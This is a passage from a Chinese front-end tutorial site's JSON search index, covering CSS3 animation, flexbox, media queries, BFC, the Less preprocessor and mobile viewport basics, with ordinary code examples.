什么是关键帧\",\"slug\":\"_2-2-什么是关键帧\",\"contents\":[\"关键帧指的是，在构成一段动画的若干帧中，起到决定性作用的 2-3 帧\"]},{\"header\":\"2.3 动画的基本使用\",\"slug\":\"_2-3-动画的基本使用\",\"contents\":[\"第一步：定义关键帧（定义动画）\",\"简单定义方式：\",\"/*写法一*/ @keyframes 动画名 { from { /*property1:value1*/ /*property2:value2*/ } to { /*property1:value1*/ } } \",\"完整定义方式：\",\"@keyframes 动画名 { 0% { /*property1:value1*/ } 20% { /*property1:value1*/ } 40% { /*property1:value1*/ } 60% { /*property1:value1*/ } 80% { /*property1:value1*/ } 100% { /*property1:value1*/ } } \",\"第二步：给元素应用动画，用到的属性如下：\",\"animation-name ：给元素指定具体的动画（具体的关键帧）\",\"animation-duration ：设置动画所需时间\",\"animation-delay ：设置动画延迟\",\".box { /* 指定动画 */ animation-name: testKey; /* 设置动画所需时间 */ animation-duration: 5s; /* 设置动画延迟 */ animation-delay: 0.5s; } \"]},{\"header\":\"2.4 动画的其他属性\",\"slug\":\"_2-4-动画的其他属性\",\"contents\":[\"animation-timing-function ，设置动画的类型，常用值如下：\",\"ease ： 平滑动画 —— 默认值\",\"linear ： 线性过渡\",\"ease-in ： 慢 → 快\",\"ease-out ： 快 → 慢\",\"ease-in-out ： 慢 → 快 → 慢\",\"step-start ： 等同于 steps (1, start)\",\"step-end ： 等同于 steps(1, end)\",\"steps( integer,?) ： 接受两个参数的步进函数。第一个参数必须为正整数，指定函数的步数。第二个参数取值可以是 start 或 end ，指定每一步的值发生变化的时间点。第二个参数默认值为 end\",\"cubic-bezie ( number, number, number, number)： 特定的贝塞尔曲线类型\",\"animation-iteration-count ，指定动画的播放次数，常用值如下：\",\"number ：动画循环次数\",\"infinite ： 无限循环\",\"animation-direction ，指定动画方向，常用值如下：\",\"normal ： 正常方向 (默认)\",\"reverse ： 反方向运行\",\"alternate ： 动画先正常运行再反方向运行，并持续交替运行\",\"alternate-reverse ： 动画先反运行再正方向运行，并持续交替运行\",\"animation-fill-mode ，设置动画之外的状态，常用值如下：\",\"forwards ： 设置对象状态为动画结束时的状态\",\"backwards ： 设置对象状态为动画开始时的状态\",\"animation-play-state ，设置动画的播放状态，常用值如下：\",\"running ： 运动 (默认)\",\"paused ： 暂停\"]},{\"header\":\"2.5 动画复合属性\",\"slug\":\"_2-5-动画复合属性\",\"contents\":[\"只设置一个时间表示 duration ，设置两个时间分别是： duration 和 delay ，其他属性没有数量和顺序要求\",\".inner { animation: atguigu 3s 0.5s linear 2 alternate-reverse forwards; } \",\"备注： animation-play-state 一般单独使用\"]}]},\"/front-end/css-notes/28-CSS3%E4%BC%B8%E7%BC%A9%E7%9B%92%E6%A8%A1%E5%9E%8B.html\":{\"title\":\"CSS3伸缩盒模型\",\"contents\":[{\"header\":\"1. 伸缩盒模型\",\"slug\":\"_1-伸缩盒模型\",\"contents\":[\"2009 年， W3C 提出了一种新的盒子模型 —— Flexible Box （伸缩盒模型，又称：弹性盒子）\",\"它可以轻松的控制：元素分布方式、元素对齐方式、元素视觉顺序 .......\",\"截止目前，除了在部分 IE 浏览器不支持，其他浏览器均已全部支持\",\"伸缩盒模型的出现，逐渐演变出了一套新的布局方案 —— flex 布局\",\"小贴士：\",\"传统布局是指：基于传统盒状模型，主要靠： display 属性 + position 属性 + float 属性\",\"flex 布局目前在移动端应用比较广泛，因为传统布局不能很好的呈现在移动设备上\"]},{\"header\":\"2. 伸缩容器、伸缩项目\",\"slug\":\"_2-伸缩容器、伸缩项目\",\"contents\":[\"伸缩容器：开启了 flex 的元素，就是伸缩容器 \",\"给元素设置： display: flex 或 display: inline-flex ，该元素就变为了伸缩容器\",\"display: inline-flex 很少使用，因为可以给多个伸缩容器的父容器，也设置为伸缩容器\",\"一个元素可以同时是：伸缩容器、伸缩项目\",\"伸缩项目：伸缩容器所有子元素自动成为了伸缩项目 \",\"仅伸缩容器的子元素成为了伸缩项目，孙子元素、重孙子元素等后代，不是伸缩项目\",\"无论原来是哪种元素（块、行内块、行内），一旦成为了伸缩项目，全都会“块状化”\"]},{\"header\":\"3. 主轴与侧轴\",\"slug\":\"_3-主轴与侧轴\",\"contents\":[\"主轴： 伸缩项目沿着主轴排列，主轴默认是水平的，默认方向是：从左到右（左边是起点，右边是终点）\",\"侧轴： 与主轴垂直的就是侧轴，侧轴默认是垂直的，默认方向是：从上到下（上边是起点，下边是终点）\"]},{\"header\":\"4. 主轴方向\",\"slug\":\"_4-主轴方向\",\"contents\":[\"属性名：flex-direction\",\"常用值如下：\",\"row ：主轴方向水平从左到右 —— 默认值\",\"row-reverse ：主轴方向水平从右到左\",\"column ：主轴方向垂直从上到下\",\"column-reverse ：主轴方向垂直从下到上\",\"CSS3伸缩盒模型01.png\",\"注意：改变了主轴的方向，侧轴方向也随之改变\"]},{\"header\":\"5. 主轴换行方式\",\"slug\":\"_5-主轴换行方式\",\"contents\":[\"属性名：flex-wrap\",\"常用值如下：\",\"nowrap ：默认值，不换行\",\"CSS3伸缩盒模型02.png\",\"wrap ：自动换行，伸缩容器不够自动换行\",\"CSS3伸缩盒模型03.png\",\"wrap-reverse ：反向换行\",\"CSS3伸缩盒模型04.png\"]},{\"header\":\"6. flex-flow\",\"slug\":\"_6-flex-flow\",\"contents\":[\"flex-flow 是一个复合属性，复合了 flex-direction 和 flex-wrap 两个属性。值没有顺序要求\",\"flex-flow: row wrap; \"]},{\"header\":\"7. 主轴对齐方式\",\"slug\":\"_7-主轴对齐方式\",\"contents\":[\"属性名：justify-content\",\"常用值如下：\",\"flex-start ：主轴起点对齐。—— 默认值\",\"flex-end ：主轴终点对齐\",\"center ：居中对齐\",\"space-between ：均匀分布，两端对齐（最常用）\",\"space-around ：均匀分布，两端距离是中间距离的一半\",\"space-evenly ：均匀分布，两端距离与中间距离一致\",\"CSS3伸缩盒模型05.png\"]},{\"header\":\"8. 侧轴对齐方式\",\"slug\":\"_8-侧轴对齐方式\",\"contents\":[]},{\"header\":\"8.1 一行的情况\",\"slug\":\"_8-1-一行的情况\",\"contents\":[\"所需属性： align-items\",\"常用值如下：\",\"flex-start ：侧轴的起点对齐\",\"flex-end ：侧轴的终点对齐\",\"center ：侧轴的中点对齐\",\"baseline : 伸缩项目的第一行文字的基线对齐\",\"stretch ：如果伸缩项目未设置高度，将占满整个容器的高度。—— （默认值）\",\"CSS3伸缩盒模型06.png\"]},{\"header\":\"8.2 多行的情况\",\"slug\":\"_8-2-多行的情况\",\"contents\":[\"所需属性： align-content\",\"常用值如下：\",\"flex-start ：与侧轴的起点对齐\",\"flex-end ：与侧轴的终点对齐\",\"center ：与侧轴的中点对齐\",\"space-between ：与侧轴两端对齐，中间平均分布\",\"space-around ：伸缩项目间的距离相等，比距边缘大一倍\",\"space-evenly : 在侧轴上完全平分\",\"stretch ：占满整个侧轴。—— 默认值\",\"CSS3伸缩盒模型07.png\"]},{\"header\":\"9. flex实现水平垂直居中\",\"slug\":\"_9-flex实现水平垂直居中\",\"contents\":[\"方法一：父容器开启 flex 布局，随后使用 justify-content 和 align-items 实现水平垂直居中\",\"方法二：父容器开启 flex 布局，随后子元素 margin: auto\"]},{\"header\":\"10. 伸缩性\",\"slug\":\"_10-伸缩性\",\"contents\":[]},{\"header\":\"10.1 flex-basis\",\"slug\":\"_10-1-flex-basis\",\"contents\":[\"概念： flex-basis 设置的是主轴方向的基准长度，会让宽度或高度失效\",\"备注：主轴横向：宽度失效；主轴纵向：高度失效\",\"作用：浏览器根据这个属性设置的值，计算主轴上是否有多余空间，默认值 auto ，即：伸缩项目的宽或高\"]},{\"header\":\"10.2 flex-grow（伸）\",\"slug\":\"_10-2-flex-grow-伸\",\"contents\":[\"概念： flex-grow 定义伸缩项目的放大比例，默认为 0 ，即：纵使主轴存在剩余空间，也不拉伸 （放大）\",\"规则：\",\"若所有伸缩项目的 flex-grow 值都为 1 ，则：它们将等分剩余空间（如果有空间的话）\",\"若三个伸缩项目的 flex-grow 值分别为： 1 、 2 、 3 ，则：分别瓜分到： 1/6 、 2/6 、 3/6 的空间\"]},{\"header\":\"10.3 flex-shrink（缩）\",\"slug\":\"_10-3-flex-shrink-缩\",\"contents\":[\"概念： flex-shrink 定义了项目的压缩比例，默认为 1 ，即：如果空间不足，该项目将会缩小\",\"收缩项目的计算，略微复杂一点，我们拿一个场景举例：\",\"例如： 三个收缩项目，宽度分别为： 200px 、 300px 、 200px ，它们的 flex-shrink 值分别为： 1 、 2 、 3\",\"若想刚好容纳下三个项目，需要总宽度为 700px ，但目前容器只有 400px ，还差 300px 所以每个人都要收缩一下才可以放下，具体收缩的值，这样计算：\",\"计算分母： (200×1) + (300×2) + (200×3) = 1400\",\"计算比例： \",\"项目一： (200×1) / 1400 = 比例值1\",\"项目二： (300×2) / 1400 = 比例值2\",\"项目三： (200×3) / 1400 = 比例值3\",\"计算最终收缩大小： \",\"项目一需要收缩： 比例值1 × 300\",\"项目二需要收缩： 比例值2 × 300\",\"项目三需要收缩： 比例值3 × 300\"]},{\"header\":\"11. flex复合属性\",\"slug\":\"_11-flex复合属性\",\"contents\":[\"flex 是复合属性，复合了： flex-grow 、 flex-shrink 、 flex-basis 三个属性，默认值为 0 1 auto\",\"如果写 flex:1 1 auto ，则可简写为： flex:auto\",\"如果写 flex: 1 1 0 ，则可简写为： flex: 1\",\"如果写 flex: 0 0 auto ，则可简写为： flex: none\",\"如果写 flex: 0 1 auto ，则可简写为： flex: 0 auto —— 即 flex 初始值\"]},{\"header\":\"12. 项目排序\",\"slug\":\"_12-项目排序\",\"contents\":[\"order 属性定义项目的排列顺序。数值越小，排列越靠前，默认为 0\"]},{\"header\":\"13. 单独对齐\",\"slug\":\"_13-单独对齐\",\"contents\":[\"通过 align-self 属性，可以单独调整某个伸缩项目的对齐方式\",\"默认值为 auto ，表示继承父元素的 align-items 属性\"]}]},\"/front-end/css-notes/29-CSS3%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80.html\":{\"title\":\"CSS3响应式布局\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"响应式布局指的是同一页面在不同屏幕尺寸下有不同的布局\"]},{\"header\":\"1. 媒体查询\",\"slug\":\"_1-媒体查询\",\"contents\":[]},{\"header\":\"1.1 媒体类型\",\"slug\":\"_1-1-媒体类型\",\"contents\":[\"值\",\"含义\",\"all\",\"检测所有设备\",\"screen\",\"检测电子屏幕，包括：电脑屏幕、平板屏幕、手机屏幕等\",\"print\",\"检测打印机\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> <style> h1 { width: 600px; height: 400px; line-height: 400px; background-image: linear-gradient(30deg, red, yellow, green); margin: 0 auto; text-align: center; font-size: 100px; color: white; text-shadow: 0 0 10px black; } /* 只有在打印机或打印预览才应用的样式 */ @media print { h1 { background: transparent; } } </style> </head> <body> <h1>新年快乐</h1> </body> </html> \"]},{\"header\":\"1.2 媒体特性\",\"slug\":\"_1-2-媒体特性\",\"contents\":[\"值\",\"含义\",\"width\",\"检测视口宽度\",\"max-width\",\"检测视口最大宽度\",\"min-width\",\"检测视口最小宽度\",\"height\",\"检测视口高度\",\"max-height\",\"检测视口最大高度\",\"min-height\",\"检测视口最小高度\",\"device-width\",\"检测设备屏幕的宽度\",\"max-device-width\",\"检测设备屏幕的最大宽度\",\"min-device-width\",\"检测设备屏幕的最小宽度\",\"orientation\",\"检测视口的旋转方向（是否横屏） 1. portrait ：视口处于纵向，即高度大于等于宽度2. landscape ：视口处于横向，即宽度大于高度\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Document</title> <style> * { margin: 0; padding: 0; } h1 { height: 200px; background-color: gray; text-align: center; line-height: 200px; font-size: 100px; } /* 检测到视口的宽度为800px时*/ @media (width: 800px) { h1 { background-color: green; } } /* 检测到视口的宽度小于等于700px时*/ @media (max-width: 700px) { h1 { background-color: orange; } } /* 检测到视口的宽度大于等于900px时*/ @media (min-width: 900px) { h1 { background-color: deepskyblue; } } </style> </head> <body> <h1>你好啊</h1> </body> </html> \"]},{\"header\":\"1.3 运算符\",\"slug\":\"_1-3-运算符\",\"contents\":[\"值\",\"含义\",\"and\",\"并且\",\", 或 or\",\"或\",\"not\",\"否定\",\"only\",\"肯定\"]},{\"header\":\"1.4 常用阈值\",\"slug\":\"_1-4-常用阈值\",\"contents\":[\"在实际开发中，会将屏幕划分成几个区间，例如：\",\"CSS3响应式布局01.png\"]}]},\"/front-end/css-notes/30-CSS3BFC.html\":{\"title\":\"CSS3BFC\",\"contents\":[{\"header\":\"1. 什么是BFC\",\"slug\":\"_1-什么是bfc\",\"contents\":[\"W3C 上对 BFC 的定义：\",\"原文：Floats, absolutely positioned elements, block containers (such as inline-blocks, table-cells, and table-captions) that are not block boxes, and block boxes with 'overflow' other than 'visible' (except when that value has been propagated to the viewport) establish new block formatting contexts for their contents.\",\"译文：浮动、绝对定位元素、不是块盒子的块容器（如 inline-blocks 、 table-cells 和 table-captions ），以及 overflow 属性的值除 visible 以外的块盒，将为其内容建立新的块格式化上下文\",\"MDN 上对 BFC 的描述：\",\"块格式化上下文（Block Formatting Context，BFC） 是 Web 页面的可视 CSS 渲染的一部分，是块盒子的布局过程发生的区域，也是浮动元素与其他元素交互的区域\",\"更加通俗的描述：\",\"BFC 是 Block Formatting Context （块级格式上下文），可以理解成元素的一个 “特异功能”\",\"该 “特异功能”，在默认的情况下处于关闭状态；当元素满足了某些条件后，该“特异功能”被激活\",\"所谓激活“特异功能”，专业点说就是：该元素创建了 BFC （又称：开启了 BFC ）\"]},{\"header\":\"2. 开启了BFC能解决什么问题\",\"slug\":\"_2-开启了bfc能解决什么问题\",\"contents\":[\"元素开启 BFC 后，其子元素不会再产生 margin 塌陷问题\",\"元素开启 BFC 后，自己不会被其他浮动元素所覆盖\",\"元素开启 BFC 后，就算其子元素浮动，元素自身高度也不会塌陷\"]},{\"header\":\"3. 如何开启BFC\",\"slug\":\"_3-如何开启bfc\",\"contents\":[\"根元素\",\"浮动元素绝对定位、固定定位的元素\",\"行内块元素\",\"表格单元格： table 、 thead 、 tbody 、 tfoot 、 th 、 td 、 tr 、 caption\",\"overflow 的值不为 visible 的块元素\",\"伸缩项目\",\"多列容器\",\"column-span 为 all 的元素（即使该元素没有包裹在多列容器中）\",\"display 的值，设置为 flow-root\"]}]},\"/front-end/css-notes/31-less.html\":{\"title\":\"less\",\"contents\":[{\"header\":\"1. 简介\",\"slug\":\"_1-简介\",\"contents\":[\"Less（Leaner Style Sheets 的缩写）是一门 CSS 扩展语言，也称为 CSS 预处理器\",\"做为 CSS 的一种形式的扩展，它并没有减少 CSS 的功能，而是在现有的 CSS 语法上，为 CSS 加入程序式语言的特性\",\"它在 CSS 的语法基础上，引入了变量，Mixin（混入），运算以及函数等功能，大大简化了 CSS 的编写，并且降低了 CSS 的维护成本，就像它的名称所说的那样，Less 可以让我们用更少的代码做更多的事情\",\"Less 中文网址：Less 中文网 (bootcss.com)\",\"常见的 CSS 预处理器：Sass、Less、Stylus\",\"一句话：Less 是一门 CSS 预处理语言，它扩展了 CSS 的动态特性\"]},{\"header\":\"2. 安装\",\"slug\":\"_2-安装\",\"contents\":[\"用node运行Less（注意如果使用VSCode无需安装Less）\",\"安装 node.js\",\"检查是否安装成功，使用 cmd 命令输入 node -v 查看版本即可\",\"基于 node.js 在线安装 Less，使用 cmd 命令输入 npm install -g less 即可\",\"检查是否安装成功，使用 cmd 命令 lessc -v 查看版本即可\",\"VSCode使用Less\",\"本质上，Less 包含一套自定义的语法及一个解析器，用户根据这些语法定义自己的样式规则，这些规则最终会通过解析器，编译生成对应的 CSS 文件\",\"所以，我们需要把我们的 Less 文件，编译生成为 CSS 文件，这样我们的 HTML 页面才能使用\",\"VSCode中可以使用Easy LESS 插件\",\"这个插件可以自动将less文件转义成css文件\",\"只要保存一下 less 文件，会自动生成 CSS 文件\"]},{\"header\":\"3. 注释(Comments)\",\"slug\":\"_3-注释-comments\",\"contents\":[\"单行注释 \",\"语法：// 注释内容\",\"快捷键：ctrl + /\",\"不会在CSS中出现\",\"块注释 \",\"语法：/* 注释内容 */\",\"快捷键： Shift + Alt + A\",\"/* * 一个块注释 * style comment! */ // 这一行被注释掉了！ div { color: red; } \"]},{\"header\":\"4. 变量(Variables)\",\"slug\":\"_4-变量-variables\",\"contents\":[\"变量是指没有固定值，可以改变的\",\"CSS 中的一些颜色和数值等经常使用\",\"语法：\",\"定义变量：@变量名: 值;\",\"使用变量：CSS属性：@变量名;\"]},{\"header\":\"4.1 变量命名规范\",\"slug\":\"_4-1-变量命名规范\",\"contents\":[\"必须有 @ 为前缀\",\"不能包含特殊字符\",\"不能以数字开头\",\"大小写敏感\"]},{\"header\":\"4.2 基本使用\",\"slug\":\"_4-2-基本使用\",\"contents\":[\"// 定义变量 @myColor: pink; // 使用变量 .box { color: @myColor; } a { color: @myColor; } \"]},{\"header\":\"4.3 变量插值(Variable Interpolation)\",\"slug\":\"_4-3-变量插值-variable-interpolation\",\"contents\":[\"变量用于选择器名、属性名、URL、@import语句\",\"@my-selector: banner; // 需要添加 {} .@{my-selector} { font-weight: bold; line-height: 40px; margin: 0 auto; } \",\"@property: color; .widget { @{property}: #0ee; background-@{property}: #999; } \",\"// Variables @images: '../img'; // Usage body { color: #444; background: url('@{images}/white-sand.png'); } \",\"// Variables @themes: '../../src/themes'; // Usage @import '@{themes}/tidal-wave.less'; \"]},{\"header\":\"4.4 延迟加载(Lazy Evaluation)\",\"slug\":\"_4-4-延迟加载-lazy-evaluation\",\"contents\":[\"当一个变量被声明多次，会取最后一次的值，并从当前作用域往外寻找变量\",\"@var: 0; .class { @var: 1; .brass { @var: 2; three: @var; @var: 3; } one: @var; } \",\"编译后\",\".class { one: 1; } .class .brass { three: 3; } \"]},{\"header\":\"4.5 属性名变量(Properties as Variables)\",\"slug\":\"_4-5-属性名变量-properties-as-variables\",\"contents\":[\".widget { color: #efefef; background-color: $color; } \",\"编译后\",\".widget { color: #efefef; background-color: #efefef; } \"]},{\"header\":\"5. 嵌套(Nesting)\",\"slug\":\"_5-嵌套-nesting\",\"contents\":[]},{\"header\":\"5.1 基本使用\",\"slug\":\"_5-1-基本使用\",\"contents\":[\"Less 提供了使用嵌套(nesting)代替层叠或与层叠结合使用的能力\",\"我们经常用到选择器的嵌套：\",\"#header .logo { width: 300px; } \",\"less 嵌套写法：\",\"#header { .logo { width: 300px; } } \",\"用 Less 书写的代码更加简洁，并且模仿了 HTML 的组织结构\"]},{\"header\":\"5.2 父选择器 (Parent Selectors)\",\"slug\":\"_5-2-父选择器-parent-selectors\",\"contents\":[\"在嵌套规则中， & 表示父选择器，常用于给现有选择器添加伪类\",\"例：\",\".header { a { color: blue; &:hover { color: green; } } } \",\"编译后：\",\".header a { color: blue; } .header a:hover { color: green; } \",\"你还可以使用此方法将伪选择器（pseudo-selectors）与混合（mixins）一同使用。下面是一个经典的 clearfix 技巧，重写为一个混合（mixin） (& 表示当前选择器的父级）：\",\".clearfix { display: block; zoom: 1; &:after { content: \\\" \\\"; display: block; font-size: 0; height: 0; clear: both; visibility: hidden; } } \"]},{\"header\":\"6. 混合(Mixins)\",\"slug\":\"_6-混合-mixins\",\"contents\":[\"混合(Mixin)是一种将一组属性从一个规则集包含(或混入)到另一个规则集的方式，可理解为复制粘贴\"]},{\"header\":\"6.1 普通混合\",\"slug\":\"_6-1-普通混合\",\"contents\":[\"如定义了一个bordered类，如果希望在其它规则集中使用这些属性，只需像下面这样输入所需属性的类（class）名称即可\",\".bordered { border-top: dotted 1px black; border-bottom: solid 2px black; } #menu a { color: #111; .bordered(); } .post a { color: red; .bordered(); } \",\".bordered { border-top: dotted 1px black; border-bottom: solid 2px black; } #menu a { color: #111; border-top: dotted 1px black; border-bottom: solid 2px black; } .post a { color: red; border-top: dotted 1px black; border-bottom: solid 2px black; } \",\"使用类选择器时可以在选择器后边添加一个括号，这时我们实际上就创建了一个mixins，这种是不会被识别进css\",\" .myMixin() { width: 400px; height: 400px; } .p4 { .myMixin; //或.myMixin();都可以 } \"]},{\"header\":\"6.2 带参数的混合(Parametric Mixins)\",\"slug\":\"_6-2-带参数的混合-parametric-mixins\",\"contents\":[\"混合带参数，参数需要按顺序传递\",\".border(@width, @style, @color) { border: @width @style @color; } div { .border(1px, solid, #ccc); } \",\"div { border: 1px solid #ccc; } \",\"混合带参数并有默认值\",\"需注意的是，就算有默认值，也要按顺序传递\",\".border(@width, @style, @color: #ccc) { border: @width @style @color; } div { .border(1px, solid); } // 会出错 .border(@width: 1px, @style, @color) { border: @width @style @color; } div { .border(solid, #ccc); } \"]},{\"header\":\"6.3 命名参数\",\"slug\":\"_6-3-命名参数\",\"contents\":[\"可以在向混合传参时指定参数名称，从而不需要按顺序传入\",\".border(@width, @style, @color: #ccc) { border: @width @style @color; } div { .border(@style: solid, @color: red, @width: 100px); } \"]},{\"header\":\"6.4 @arguments变量\",\"slug\":\"_6-4-arguments变量\",\"contents\":[\"@arguments 变量包含了传入的所有参数\",\".box-shadow(@x: 0, @y: 0, @blur: 1px, @color: #000) { -webkit-box-shadow: @arguments; -moz-box-shadow: @arguments; box-shadow: @arguments; } .big-block { .box-shadow(2px, 5px); } \",\".big-block { -webkit-box-shadow: 2px 5px 1px #000; -moz-box-shadow: 2px 5px 1px #000; box-shadow: 2px 5px 1px #000; } \"]},{\"header\":\"6.5 匹配模式(Pattern-matching)\",\"slug\":\"_6-5-匹配模式-pattern-matching\",\"contents\":[\"在多个相同的混合中(参数个数必须相同)，匹配特定的混合\",\".mixin(dark, @color) { color: darken(@color, 10%); } .mixin(light, @color) { color: lighten(@color, 10%); } // @_ 表示匹配所有 .mixin(@_, @color) { display: block; } @switch: light; .class { .mixin(@switch, #888); } \",\".class { color: #a2a2a2; display: block; } \"]},{\"header\":\"6.6 运算(Operations)\",\"slug\":\"_6-6-运算-operations\",\"contents\":[\"任何数字、颜色或者变量都可以参与运算\",\"Less 提供了加（+）、减（-）、乘（*）、除（/）算术运算\",\"/* Less 里面写 */ @width: 10px + 5; div { border: @width solid red; } /* Less 甚至还可以这样 */ width: (@width + 5) * 2; \",\"生成的 css\",\"div { border: 15px solid red; } \",\"注意：\",\"乘号（*）和除号（/）的写法要牢记\",\"运算符中间左右必须有个空格隔开 1px + 5\",\"在新版本的 Less 中，除法有变动，应将 100px / 10 改为 (100px / 10)，否则没有效果\",\"对于两个不同的单位的值之间的运算，运算结果的值取第一个值的单位\",\"如果两个值之间只有一个值有单位，则运算结果就取该单位\",\"计算结果以操作数最左侧的单位类型为准：\",\"@conversion-1: 5cm + 10mm; // 6cm @conversion-2: 2 - 3cm - 5mm; // -1.5cm @conversion-3: 3.1 * 2cm; // 6.2cm @conversion-4: (4px / 2); // 4px / 2 // conversion is impossible @incompatible-units: 1cm - 1px; // 0.97354167cm // example with variables @base: 5%; @filler: @base * 2; // 10% @other: @base + @filler; // 15% @color: #224488 / 2; // #112244 background-color: #112244 + #111; // #223355 \"]},{\"header\":\"7. 继承(Extend)\",\"slug\":\"_7-继承-extend\",\"contents\":[\"Extend Syntax\",\"继承可让多个选择器应用同一组属性，最终编译为并集选择器\",\"其性能比混合高，但灵活性比混合低\",\"nav ul { &:extend(.inline); background: blue; } .inline { color: red; } \",\"nav ul { background: blue; } .inline, nav ul { color: red; } \"]},{\"header\":\"8. 避免编译\",\"slug\":\"_8-避免编译\",\"contents\":[\"通过加引号可以避免 Less 编译，直接把内容输出到 CSS 中\",\".banner .inline .header { width: '100px + 100px'; height: 100px + 100px; } \",\".banner .inline .header { width: '100px + 100px'; height: 200px; } \"]},{\"header\":\"9. 函数(Functions)\",\"slug\":\"_9-函数-functions\",\"contents\":[\"Less 内置了多种函数用于转换颜色、处理字符串、算术运算等\",\"这些函数在Less 函数手册中有详细介绍\",\"函数的用法非常简单\",\"下面这个例子将介绍如何利用 percentage 函数将 0.5 转换为 50%，将颜色饱和度增加 5%，以及颜色亮度降低 25% 并且色相值增加 8 等用法：\",\"@base: #f04615; @width: 0.5; .class { width: percentage(@width); // returns `50%` color: saturate(@base, 5%); background-color: spin(lighten(@base, 25%), 8); } \"]},{\"header\":\"10. 导入（Importing）\",\"slug\":\"_10-导入-importing\",\"contents\":[\"你可以导入一个 .less 文件，此文件中的所有变量就可以全部使用了\",\"如果导入的文件是 .less 扩展名，则可以将扩展名省略掉：\",\"@import url(\\\"syntax.less\\\");//url可以不加但是可能会有问题 @import \\\"library\\\"; // library.less @import \\\"typo.css\\\"; \"]},{\"header\":\"11. 导出\",\"slug\":\"_11-导出\",\"contents\":[\"手动给每个less文件指定导出\",\"写法：在 less 文件的第一行添加 // out: 存储URL\",\"导出必须写到第一行\",\"例：\",\"// out: ./mycss/pink.css \",\"设置导出： 当前目录下，创建一个 mycss 文件夹， 生成 一个 pink.css（做了改名）\",\"例：\",\"// out: ./mycss/ \",\"设置导出： 当前目录下，创建一个 mycss 文件夹， 生成 一个跟less一样的文件名（原名）\",\"less 禁止导出：在 less 文件第一行添加\",\"// out: false \"]}]},\"/front-end/css-notes/32-%E7%A7%BB%E5%8A%A8%E7%AB%AFweb%E5%BC%80%E5%8F%91.html\":{\"title\":\"移动端web开发\",\"contents\":[{\"header\":\"1. 移动端基础\",\"slug\":\"_1-移动端基础\",\"contents\":[]},{\"header\":\"1.1 浏览器现状\",\"slug\":\"_1-1-浏览器现状\",\"contents\":[\"由于移动端浏览器的发展比较晚，所以主流移动端浏览器的内核都是基于 Webkit 内核打造的\",\"我们在进行移动端的页面开发时，兼容性主要考虑 Webkit 内核\"]},{\"header\":\"1.2 手机屏幕现状\",\"slug\":\"_1-2-手机屏幕现状\",\"contents\":[\"目前无论是 安卓 还是 IOS，移动端设备的屏幕尺寸非常多，碎片化非常严重\",\"但是，前端页面开发者无需关注这些分辨率，因为我们常用的尺寸单位是 px\"]},{\"header\":\"1.3 常见移动端屏幕尺寸\",\"slug\":\"_1-3-常见移动端屏幕尺寸\",\"contents\":[\"目前移动端的屏幕尺寸非常多，并且随着发展还会越来越多\",\"但是，对于移动端的 Web 开发来说，我们不用考虑太多\",\"对于专门的 安卓 和 IOS 开发，才需要特别关注 dp、dpi、pt、ppi 等单位\"]},{\"header\":\"1.4 移动端调试方法\",\"slug\":\"_1-4-移动端调试方法\",\"contents\":[\"Chrome DevTools（谷歌浏览器）的模拟手机调试\",\"搭建本地 Web 服务器，手机和服务器一个局域网内，通过手机访问服务器\",\"使用外网服务器，直接 IP 或 域名 访问\"]},{\"header\":\"1.5 像素\",\"slug\":\"_1-5-像素\",\"contents\":[\"屏幕是由一个一个发光的小点构成，这一个个的小点就是像素\",\"分辨率：1920 x 1080 说的就是屏幕中小点的数量，横向1920个像素点，纵向1080个像素点\",\"在前端开发中像素要分成两种情况讨论：CSS像素 和 物理像素\",\"物理像素，显示器的小点点就属于物理像素\",\"CSS像素，编写网页时，我们所用像素都是CSS像素\",\"浏览器在显示网页时，需要将CSS像素转换为物理像素然后再呈现\",\"一个CSS像素最终由几个物理像素显示，由浏览器决定， 默认情况下在pc端，一个CSS像素=一个物理像素\"]},{\"header\":\"2. 视口\",\"slug\":\"_2-视口\",\"contents\":[\"视口（viewport）：浏览器显示页面内容的屏幕区域\",\"视口的分类：布局视口、视觉视口、理想视口\"]},{\"header\":\"2.1 布局视口\",\"slug\":\"_2-1-布局视口\",\"contents\":[\"为了解决早期 PC 端网页在手机上显示的问题，移动端浏览器都默认设置了一个布局视口（layout viewport）\",\"IOS、Android 基本都将布局视口分辨率设置为 980px，所以 PC 上的网页大多也能在手机上呈现，但是网页元素看上去会非常小，一般可以通过手动缩放网页\",\"移动端web开发01.png\"]},{\"header\":\"2.2 视觉视口\",\"slug\":\"_2-2-视觉视口\",\"contents\":[\"字面意思，它是用户正在看到的网站的区域。注意：是网站的区域\",\"我们可以通过缩放去操作视觉视口，但不会影响布局视口，布局视口仍保持原来的宽度\",\"移动端web开发02.png\"]},{\"header\":\"2.3 理想视口\",\"slug\":\"_2-3-理想视口\",\"contents\":[\"发明者：史蒂夫·乔布斯\",\"为了使网站在移动端有最理想的浏览和阅读宽度而设定\",\"理想视口，对设备来讲，是最理想的视口尺寸\",\"需要手动添写 meta 视口标签通知浏览器操作\",\"meta 视口标签的主要目的：布局视口的宽度应该与理想视口的宽度一致，简单理解就是设备有多宽，我们布局的视口就有多宽\",\"移动端 web 开发就是开发理想视口！\"]},{\"header\":\"2.4 视口总结\",\"slug\":\"_2-4-视口总结\",\"contents\":[\"视口就是浏览器显示页面内容的屏幕区域\",\"视口分为布局视口、视觉视口和理想视口\",\"我们移动端布局想要的是理想视口就是手机屏幕有多宽，我们的布局视口就有多宽\",\"想要理想视口，我们需要给我们的移动端页面添加 meta 视口标签\"]},{\"header\":\"2.5 meta视口标签\",\"slug\":\"_2-5-meta视口标签\",\"contents\":[\" <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no\\\"> \",\"name=\\\"视口\\\"\",\"content=\\\"内容中包含若干个属性，用逗号隔开\\\"\",\"属性\",\"解释说明\",\"width\",\"宽度设置的是 viewport 宽度，我们设置为 device-width “设备宽度” 特殊值\",\"initial-scale\",\"初始缩放比，大于 0 